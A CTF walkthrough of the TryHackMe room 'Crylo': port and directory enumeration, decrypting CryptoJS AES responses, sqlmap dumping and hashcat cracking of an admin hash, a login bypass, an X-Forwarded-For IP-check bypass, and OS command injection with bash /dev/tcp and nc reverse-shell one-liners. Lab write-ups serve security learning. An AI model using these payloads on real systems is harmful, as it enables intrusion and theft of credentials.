# Crylo

A writeup for the room [Crylo](https://tryhackme.com/room/crylo4a) on TryHackMe.

> Learn about the CryptoJS library and JavaScript-based client-side encryption and decryption.

<Image src={require("./logo.png").default} width="256" />

## Task 1 - Enumeration

> How many ports are open?

Start the machine and scan the ports with nmap.

```bash
nmap -sS -p- -v [IP]
```

<Image src={require("./nmap.png").default} />

> What is the 403/forbidden web page?

Open the web page in the browser and check the source code.

Other pages return a 404 error.

<Image src={require("./homepage.png").default} />

Nothing seems to be interesting, so we can try to enumerate the website with gobuster.

It is important to set the `-s` flag to search for at least the 403 status code.

```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,css,js -q -s "200,403" -u [URL]
```

<Image src={require("./gobuster.png").default} />

## Task 2 - Injection

> What is the name of the first username?

It is a common name for the default user of a web application.

> What is the password for the above user?

We can try to login with common credentials, but nothing tried works.

<Image src={require("./login.png").default} />

Looking to the response we can see that the final text cannot be parsed directly.

However, the client understands it perfectly and shows the result.

It is possible to look to the code to find how it works.

<Image src={require("./code-login.png").default} />

The client decrypts the response using the CryptoJS library.

The response is encrypted using the AES algorithm with the CBC mode and a hardcode string as key and IV.

Using Cyberchef it is possible to convert the response and see its content.

<Image src={require("./decrypt-response.png").default} />

Now that the request is known, we can try sqlmap to see if it is vulnerable to SQL injection.

The easy way to manage the request is to save it in a file and use the `-r` flag.

Using the standard risk level is not enough, add `--risk=3 --level=3` to increase it and find a vulnerability.

```bash
# Enumerate databases
sqlmap -r request --risk=3 --level=3 --dbs

# Enumerate tables in food database
sqlmap -r request --risk=3 --level=3 --tables -D food

# Dump auth data to get the hash of the admin password
sqlmap -r request --risk=3 --level=3 --dump -T auth_user -D food
sqlmap -r request --risk=3 --level=3 --dump -T auth_user -D food --data "username=admin" -C password
```

Follow the default answer for all questions except:

```
you provided a HTTP Cookie header value. The target URL provided its own cookies within the HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] n
```

We can obtain a hash of the admin password that be cracked with a tool like hashcat.

Analyzing the hash with hashid we can find the hash type is Django (PBKDF2-SHA256).

```bash
# Save hash in a file
echo "pbkdf2_sha256$260000$HxnWVrw647R53GeEUksjW5$SggM3ZAh86qRZtnn0VbWOSmHWhckfVvIsMG+jTZstpE=" > hash.txt

# Get hash type for hashcat
hashid -m hash.txt

# Crack the hash with mode 10000 (Django (PBKDF2-SHA256))
hashcat -m 10000 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

<Image src={require("./hashcat.png").default} />

## Task 3 - Encryption

> Which library is used for encryption and decryption?

Look in `/static/js/validation.js` to find the answer.

The library can be easily recognized by the capitalized name of the variable.

<Image src={require("./encryption.png").default} />

> Which JSON parameter was used to validate the pin?

Look in `/static/js/validation.js` to find the answer.

There is a specific if statement for the pin parameter.

<Image src={require("./pin-set.png").default} />

> Which encryption method is used?

Look in `/static/js/validation.js` to find the answer.

At the beginning of the file there is a comment that says that the encryption method is AES.

## Task 4 - Forbidden Bypass

> What extra header can be used to bypass the page?

Firstly, bypass the login changing the value of `pin_set` to `false`.

```
{"pin_set": "true", "email": "admin@admin.com", "success": "true"}
iL6SVLGiiyY47lh6kX353MqD9I+mcSncHWhuJl6Dg7umFTYotHmMKiPaluJ8J35LebkAv3FSyusGIO8rxwJztzwHX9Ot64ltTlbzi/spfQ4=

{"pin_set": "false", "email": "admin@admin.com", "success": "true"}
HS0kn8CQhTz7NwgLMw9tP1mWXHssgMd2MRJ9EeChrTiPlSg9HGgxyshgHbMYjhFnVbpEi5lm1bRMbgbdebHsfVsN+90GzIuDMX+SBBI9wdY=
```

> What extra header can be used to bypass the page?

Use the `X-Forwarded-For` header to bypass the IP check.

It can be easily added using Burp Suite.

Be careful to always add the header before sending any request.

```
X-Forwarded-For: 127.0.0.1
```

Once the header is added, you will see a simple input text and a submit button.

Send a request and move it to the repeater to simplify the work.

We can check for remote code execution using the following payload.

```bash
22 && sleep 10
```

We can see that the command is executed, so we can try to get a reverse shell.

```bash
ifconfig
nc -nlvp 1337
22 && bash -i >& /dev/tcp/[IP]/1337 0>&1
22 && rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.172.114 1337 >/tmp/f
```

## Task 5 - Exploitation

> What is the name of the vulnerability used to gain system access?

The vulnerability that we exploited is based on the debug form.

We can send OS commands to be executed on the target server.

[https://portswigger.net/kb/issues/00100100_os-command-injection](https://portswigger.net/kb/issues/00100100_os-command-injection)

> What is the current system’s username?

Once you obtain a reverse shell is enough to run `whoami` to get the answer.

```bash
whoami
```

> What is the user flag?

Go to the home directory of the user to find the flag.

```bash
cd
cat user.txt
```

> Which user is part of the sudo group?

It is enough to check the sudo group to find the answer.

```bash
getent group sudo
```

> What is the password for the above user?

> What is the root flag?
